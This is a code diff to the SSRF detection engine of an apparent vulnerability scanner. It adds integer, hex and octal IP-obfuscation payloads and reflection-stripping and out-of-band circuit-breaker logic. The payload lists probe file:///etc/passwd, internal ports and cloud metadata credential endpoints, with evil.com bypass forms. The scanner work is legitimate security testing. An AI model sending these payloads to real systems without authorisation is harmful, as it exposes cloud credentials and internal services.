@@ -16,9 +16,9 @@ import asyncio
 import datetime
 import json
 import random
-from urllib.parse import urlparse
+from urllib.parse import urlparse, quote, unquote
 
-from vulnclaw.core.utils import async_get, async_post, build_attack_url
+from vulnclaw.core.utils import async_get, async_post, build_attack_url, CLOUD_METADATA_ENDPOINTS
 
 try:  # dnspython 为可选依赖：缺失时 DNS/邮件安全引擎自动跳过，不影响其它检测
     import dns.resolver
@@ -104,21 +104,8 @@ class SSRFEngine(BaseEngine):
         ("http://192.168.0.1", "192.168.0.1"),
         ("http://192.168.100.1", "192.168.100.1"),
 
-        # ===== 云元数据 =====
-        ("http://169.254.169.254/latest/meta-data/", "AWS元数据"),
-        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM凭证"),
-        ("http://169.254.169.254/latest/user-data/", "AWS用户数据"),
-        ("http://169.254.169.254/latest/dynamic/instance-identity/", "AWS实例身份"),
-        ("http://metadata.google.internal/computeMetadata/v1/", "GCP元数据"),
-        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "GCP服务账号"),
-        ("http://100.100.100.200/latest/meta-data/", "阿里云元数据"),
-        ("http://100.100.100.200/latest/meta-data/ram/security-credentials/", "阿里云RAM凭证"),
-        ("http://169.254.169.254/metadata/instance?api-version=2017-08-01", "Azure元数据"),
-        ("http://169.254.169.254/openstack/latest/meta_data.json", "OpenStack元数据"),
-        ("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/", "AWS EC2凭证"),
-        ("http://169.254.169.254/latest/meta-data/local-ipv4", "AWS本地IP"),
-        ("http://169.254.169.254/latest/meta-data/public-ipv4", "AWS公网IP"),
-        ("http://169.254.169.254/latest/meta-data/hostname", "AWS主机名"),
+        # ===== 云元数据（统一权威清单，避免与云容器/业务逻辑引擎硬编码不一致） =====
+        *CLOUD_METADATA_ENDPOINTS,
 
         # ===== 文件协议 =====
         ("file:///etc/passwd", "file协议-passwd"),
@@ -154,6 +141,18 @@ class SSRFEngine(BaseEngine):
         ("http://127.0.0.1/../evil.com", "目录绕过"),
         ("http://127.0.0.1:80@evil.com", "端口绕过"),
 
+        # ===== 地址变形（整数/十六进制/短IP/八进制） =====
+        ("http://2130706433", "整数IP-127.0.0.1"),
+        ("http://2130706433:8080", "整数IP-127.0.0.1:8080"),
+        ("http://0x7f000001", "十六进制IP"),
+        ("http://0x7f000001:8080", "十六进制IP:8080"),
+        ("http://0x7f.0.0.1", "十六进制分段IP"),
+        ("http://0x7f.0.0.1:8080", "十六进制分段IP:8080"),
+        ("http://127.1", "短IP"),
+        ("http://127.1:8080", "短IP:8080"),
+        ("http://0177.0.0.1", "八进制IP"),
+        ("http://0177.0.0.1:8080", "八进制IP:8080"),
+
         # ===== 内网端口扫描 =====
         ("http://127.0.0.1:22", "SSH端口"),
         ("http://127.0.0.1:3306", "MySQL端口"),
@@ -181,6 +180,7 @@ class SSRFEngine(BaseEngine):
 
         # 文件内容特征
         'root:', 'nobody:', 'daemon:', 'bin:',
+        'internal_secret',  # 靶场/自建服务 SSRF 回显特征
         'Windows Registry', 'HKEY_LOCAL_MACHINE',
         '127.0.0.1', 'localhost',
 
@@ -265,8 +265,9 @@ class SSRFEngine(BaseEngine):
                         return bypass_result
                     continue
 
-                # ===== 检测 SSRF 响应特征 =====
-                if self._has_ssrf_indicator(text):
+                # ===== 检测 SSRF 响应特征（剥离 payload 反射后再匹配，防回显型误报）=====
+                stripped_text = self._strip_payload_refl(text, payload)
+                if self._has_ssrf_indicator(stripped_text):
                     evidence = self._extract_ssrf_evidence(text, payload)
                     return {
                         'url': url,
@@ -274,12 +275,14 @@ class SSRFEngine(BaseEngine):
                         'payload': payload,
                         'type': f'SSRF({desc})',
                         'ai_verdict': '高',
+                        'severity': 'High',
+                        'confidence': 'high',
                         'evidence': evidence,
                         'diff_ratio': 0.5
                     }
 
                 # ===== 检测云元数据 =====
-                if self._is_cloud_metadata(text):
+                if self._is_cloud_metadata(stripped_text):
                     return {
                         'url': url,
                         'parameter': param,
@@ -345,6 +348,26 @@ class SSRFEngine(BaseEngine):
             logger.debug("suppressed exception (engine audit)")
 
         return True
+
+    @staticmethod
+    def _strip_payload_refl(text: str, payload: str) -> str:
+        """剥离响应中 payload 的反射形态，返回剩余文本（防回显型误报）。
+
+        与 K 轮'响应出现次数 > payload 内嵌次数才算命中的防御一致：
+        payload 里的 localhost/127.0.0.1 被页面原样回显时不构成 SSRF 特征。
+        """
+        if not text or not payload:
+            return text or ""
+        out = text
+        for form in {
+            payload,
+            quote(payload, safe=""),
+            unquote(payload),
+            payload.replace("@", "%40"),
+        }:
+            if form:
+                out = out.replace(form, "")
+        return out
 
     def _has_ssrf_indicator(self, text: str) -> bool:
         """检测 SSRF 响应特征"""
@@ -433,6 +456,13 @@ class SSRFEngine(BaseEngine):
         from vulnclaw.modules.vuln_scanner.oob_interactsh import get_interactsh_poll
 
         scan_id = self._gen_scan_token()
+        # P0 熔断：外发被封禁时整段跳过——不发注定无回连的注入请求，也不空等轮询
+        from vulnclaw.core.oob_channel import is_oob_blocked, target_key_from_url
+        _oob_target = target_key_from_url(url)
+        if is_oob_blocked(_oob_target):
+            logger.debug(f"SSRF OOB 熔断生效，跳过 {url} 的带外盲打")
+            return None
+
         # 命中与扫描周期隔离：OOB 命中记录以 scan_id 前缀标识
         oob_records = []
 
@@ -455,7 +485,8 @@ class SSRFEngine(BaseEngine):
         # 短轮询（复用 verify 阶段的 Interactsh 通道）
         try:
             interactions = await asyncio.wait_for(
-                get_interactsh_poll(interactsh_domain, timeout=8), timeout=10
+                get_interactsh_poll(interactsh_domain, timeout=8,
+                                    target=_oob_target), timeout=10
             )
         except Exception as e:
             logger.debug(f"SSRF OOB 轮询失败: {e}")
